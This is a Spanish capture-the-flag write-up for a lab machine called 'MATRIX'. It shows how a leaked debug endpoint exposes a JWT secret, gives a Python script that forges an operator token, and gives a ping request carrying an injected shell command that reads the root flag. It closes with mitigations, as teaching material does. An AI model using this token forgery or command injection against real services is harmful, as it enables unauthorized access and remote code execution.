# MATRIX — WHOAMI-LABS.COM

**Dificultad:** ★★★★★☆☆☆ difícil (5 puntos)  
**Categoría:** Web Exploit / JWT / Command Injection  
**Plataforma:** Linux (Docker)  
**Estado:** resuelto

## Resumen

La aplicación acepta cualquier identidad en `/login` y entrega un JWT con
`role=guest`. La ruta de depuración `/api/debug` expone el secreto usado para
firmar esos tokens. Con ese secreto se puede emitir un token con
`role=operator`, acceder al panel `/construct` y abusar de la interpolación de
`target` en `ping` para ejecutar comandos como el usuario del proceso Node.js.

## Reconocimiento

La enumeración de `172.17.0.2` mostró:

```text
22/tcp   open  ssh
3000/tcp open  http  Node.js Express
```

La página raíz contiene un formulario `POST /login`. Una petición con una
identidad arbitraria redirige a `/dashboard` y establece una cookie `token`.
El payload de un token legítimo es:

```json
{"username":"neo","role":"guest","iat":1793472741,"exp":1793479941}
```

## Exposición del secreto JWT

Aunque `/api/debug` no requiere autenticación, devuelve la configuración
interna:

```http
GET /api/debug HTTP/1.1
Host: 172.17.0.2:3000
```

Respuesta relevante:

```json
{
  "app": "matrix-construct",
  "version": "1.0.0",
  "config": {
    "jwt_secret": "z10n_c0nstruct_s3cr3t_2026"
  }
}
```

## Forging del JWT y acceso al panel

Se firmó un token HS256 con el secreto expuesto y el claim requerido por
`/construct`:

```python
import base64, hashlib, hmac, json

def b64(value):
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode()

header = b64(json.dumps({"alg": "HS256", "typ": "JWT"},
                        separators=(",", ":")).encode())
payload = b64(json.dumps({"username": "neo", "role": "operator"},
                          separators=(",", ":")).encode())
signature = b64(hmac.new(
    b"z10n_c0nstruct_s3cr3t_2026",
    f"{header}.{payload}".encode(),
    hashlib.sha256,
).digest())
token = f"{header}.{payload}.{signature}"
```

El token permitió obtener `200 OK` en `GET /construct` y confirmó la presencia
del panel de diagnóstico del operador.

## Command injection y flag root

El panel envía JSON a `POST /api/ping` con el campo `target`. El backend ejecuta
el valor mediante una cadena de shell equivalente a:

```js
execSync(`ping -c 3 ${target}`)
```

La petición de validación fue:

```http
POST /api/ping HTTP/1.1
Host: 172.17.0.2:3000
Cookie: token=<JWT firmado como operator>
Content-Type: application/json

{"target":"127.0.0.1; cat /root/flag.txt"}
```

Respuesta observada:

```json
{"output":"MATRIX{JWT_f0rg3d_RCE_p4th_h1j4ck_0wn3d_2026}\n"}
```

**Flag de Root:** `MATRIX{JWT_f0rg3d_RCE_p4th_h1j4ck_0wn3d_2026}`

## Lecciones y mitigaciones

1. Eliminar endpoints de depuración en producción y no serializar secretos
   internos en respuestas HTTP.
2. Validar los claims del JWT con una clave fuera del alcance del cliente;
   aplicar autorización explícita por ruta y rotar la clave si se expone.
3. No construir comandos con interpolación de entrada. Para diagnóstico,
   validar una dirección con un parser de IP y usar `spawn` con argumentos
   separados, sin shell.
4. Ejecutar el servicio con un usuario sin acceso de lectura a secretos de
   root y aplicar límites de red y tiempo a las comprobaciones.
